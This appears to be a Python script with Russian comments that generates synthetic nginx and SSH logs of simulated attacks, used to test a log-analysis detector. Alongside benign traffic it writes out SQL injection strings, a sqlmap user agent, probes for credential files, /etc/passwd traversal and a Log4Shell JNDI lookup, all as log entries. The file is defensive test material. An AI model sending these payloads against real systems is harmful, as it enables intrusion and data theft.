"""Генератор учебных логов с «атаками». Ничего никуда не отправляет, только пишет два файла.

Используются адреса из зарезервированных для документации диапазонов (RFC 5737):
192.0.2.0/24, 198.51.100.0/24 и 203.0.113.0/24, поэтому реальных хостов за ними нет.
"""
from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

MONTH_NAMES = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
BROWSER_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36"

# Что должен найти LogSentinel (используется в тестах и в README).
EXPECTED: dict[str, set[str]] = {
    "203.0.113.50": {"SSH-BRUTE-FORCE", "SSH-USER-ENUM"},
    "203.0.113.77": {"SSH-BRUTE-FORCE", "SSH-SUCCESS-AFTER-FAILS"},
    "198.51.100.23": {"SSH-USER-ENUM"},
    "198.51.100.99": {"WEB-LOGIN-BRUTE-FORCE"},
    "203.0.113.200": {"WEB-SCANNER", "WEB-SCANNER-UA", "WEB-ATTACK-PATTERN", "WEB-SENSITIVE-PATH"},
    "198.51.100.150": {"WEB-ATTACK-PATTERN"},
}
NORMAL_IPS = ["192.0.2.10", "192.0.2.11", "192.0.2.12", "192.0.2.13", "192.0.2.14"]


def _nginx_line(ts: datetime, ip: str, method: str, path: str, status: int, ua: str = BROWSER_UA,
                size: int = 512) -> str:
    stamp = ts.strftime("%d/") + MONTH_NAMES[ts.month - 1] + ts.strftime("/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def _ssh_line(ts: datetime, text: str, pid: int = 2201) -> str:
    stamp = f"{MONTH_NAMES[ts.month - 1]} {ts.day:>2} {ts:%H:%M:%S}"
    return f"{stamp} srv01 sshd[{pid}]: {text}"


def generate(out_dir: str | Path, seed: int = 1, start: datetime | None = None) -> tuple[Path, Path]:
    rnd = random.Random(seed)
    start = start or datetime(2026, 11, 4, 9, 0, 0, tzinfo=timezone.utc)
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    web: list[tuple[datetime, str]] = []
    ssh: list[tuple[datetime, str]] = []

    def at(seconds: float) -> datetime:
        return start + timedelta(seconds=seconds)

    # Обычная работа пользователей InvoiceShield: два часа, около 400 запросов.
    pages = [("GET", "/", 200), ("GET", "/login", 200), ("POST", "/login", 303), ("GET", "/api/invoices", 200),
             ("GET", "/api/suppliers", 200), ("GET", "/static/app.js", 200), ("GET", "/health", 200),
             ("GET", "/analytics", 200), ("GET", "/api/invoices?page=2", 200)]
    for _ in range(400):
        method, path, status = rnd.choice(pages)
        ts = at(rnd.uniform(0, 7200))
        web.append((ts, _nginx_line(ts, rnd.choice(NORMAL_IPS), method, path, status)))
    # Пара опечаток в пароле у обычного пользователя: это не атака.
    for k in range(2):
        ts = at(1800 + k * 40)
        web.append((ts, _nginx_line(ts, "192.0.2.10", "POST", "/login", 200)))
    for k in range(3):
        ts = at(2400 + k * 50)
        ssh.append((ts, _ssh_line(ts, "Failed password for admin from 192.0.2.11 port 50122 ssh2")))
    ts = at(2500)
    ssh.append((ts, _ssh_line(ts, "Accepted publickey for admin from 192.0.2.11 port 50130 ssh2: ED25519 SHA256:xxxx")))

    # 1. Подбор пароля SSH с перебором имён: 40 попыток за две минуты.
    names = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "git", "ftp", "user", "pi"]
    for k in range(40):
        ts = at(3000 + k * 3)
        user = names[k % len(names)]
        invalid = "invalid user " if user not in ("root",) else ""
        ssh.append((ts, _ssh_line(ts, f"Failed password for {invalid}{user} from 203.0.113.50 port {40000 + k} ssh2")))

    # 2. Успешный вход после серии неудач.
    for k in range(8):
        ts = at(3600 + k * 5)
        ssh.append((ts, _ssh_line(ts, f"Failed password for deploy from 203.0.113.77 port {41000 + k} ssh2")))
    ts = at(3650)
    ssh.append((ts, _ssh_line(ts, "Accepted password for deploy from 203.0.113.77 port 41100 ssh2")))

    # 3. Перебор имён: по одной попытке на имя.
    for k in range(12):
        ts = at(4000 + k * 12)
        ssh.append((ts, _ssh_line(ts, f"Invalid user svc{k} from 198.51.100.23 port {42000 + k}")))

    # 4. Подбор пароля на странице входа InvoiceShield: сначала 200, потом приложение включает 429.
    for k in range(30):
        ts = at(4500 + k * 4)
        web.append((ts, _nginx_line(ts, "198.51.100.99", "POST", "/login", 429 if k >= 20 else 200, size=1800)))

    # 5. Сканер с sqlmap: инъекции и перебор адресов.
    sqlmap_ua = "sqlmap/1.8.4#stable (https://sqlmap.org)"
    payloads = ["/api/invoices?id=1%27%20OR%20%271%27%3D%271", "/api/invoices?id=1%20UNION%20SELECT%20null,password%20FROM%20users--",
                "/api/invoices?id=1%20AND%20SLEEP(5)", "/api/suppliers?name=x%27--"]
    for k, p in enumerate(payloads):
        ts = at(5000 + k)
        web.append((ts, _nginx_line(ts, "203.0.113.200", "GET", p, 500 if k == 2 else 200, ua=sqlmap_ua)))
    guesses = ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin", "/backup.sql", "/config.php",
               "/server-status", "/actuator/health", "/xmlrpc.php", "/test", "/old", "/api/v1", "/console",
               "/login.php", "/administrator", "/db.sql", "/.aws/credentials", "/robots.txt.bak", "/cgi-bin/test.sh"]
    for k, p in enumerate(guesses):
        ts = at(5010 + k)
        web.append((ts, _nginx_line(ts, "203.0.113.200", "GET", p, 404, ua=sqlmap_ua, size=150)))

    # 6. Разовые попытки: обход каталогов и Log4Shell.
    for k, p in enumerate(["/static/..%2f..%2f..%2fetc/passwd", "/?q=${jndi:ldap://203.0.113.9/a}", "/?file=../../../../etc/passwd"]):
        ts = at(6000 + k * 7)
        web.append((ts, _nginx_line(ts, "198.51.100.150", "GET", p, 400, size=150)))

    web.sort(key=lambda x: x[0])
    ssh.sort(key=lambda x: x[0])
    access = out / "access.log"
    auth = out / "auth.log"
    access.write_text("\n".join(line for _, line in web) + "\n", encoding="utf-8")
    auth.write_text("\n".join(line for _, line in ssh) + "\n", encoding="utf-8")
    return access, auth
